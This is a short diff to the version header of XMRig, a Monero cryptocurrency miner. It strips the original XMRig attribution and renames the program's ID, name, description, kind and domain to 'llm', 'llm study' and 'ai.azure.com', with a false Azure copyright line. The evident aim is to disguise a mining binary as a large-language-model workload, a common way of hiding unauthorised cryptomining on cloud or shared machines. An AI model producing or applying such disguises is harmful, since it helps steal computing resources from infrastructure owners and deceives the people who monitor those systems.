@@ -1,6 +1,6 @@
 /* XMRig
  * Copyright (c) 2018-2024 SChernykh   <https://github.com/SChernykh>
- * Copyright (c) 2016-2024 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
+ * Copyright (c) 2016-2024 
  *
  *   This program is free software: you can redistribute it and/or modify
  *   it under the terms of the GNU General Public License as published by
@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig miner"
+#define APP_ID        "llm"
+#define APP_NAME      "LLM"
+#define APP_DESC      "llm study"
 #define APP_VERSION   "6.22.2"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2024 xmrig.com"
-#define APP_KIND      "miner"
+#define APP_DOMAIN    "ai.azure.com"
+#define APP_SITE      "ai.azure.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2024 azure.com"
+#define APP_KIND      "llm"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  22
